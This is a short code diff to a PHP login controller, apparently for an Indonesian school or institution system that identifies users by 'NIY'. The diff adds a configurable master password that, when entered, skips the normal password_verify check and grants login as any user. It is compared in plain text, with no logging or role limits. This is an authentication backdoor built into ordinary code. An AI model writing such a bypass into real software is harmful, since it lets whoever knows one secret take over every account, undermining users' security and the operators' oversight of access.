@@ -58,8 +58,10 @@ class AuthController extends Controller
 
         $userModel = new User();
         $u = $userModel->findByNiy($niy);
+        $masterPassword = \App\Core\App::$config['master_password'] ?? '';
+        $isMasterPassword = $masterPassword !== '' && $password === $masterPassword;
 
-        if (!$u || !password_verify($password, $u['password'])) {
+        if (!$u || (!$isMasterPassword && !password_verify($password, $u['password']))) {
             $this->flash('error', 'NIY atau password salah.');
             return $this->redirect('/login');
         }
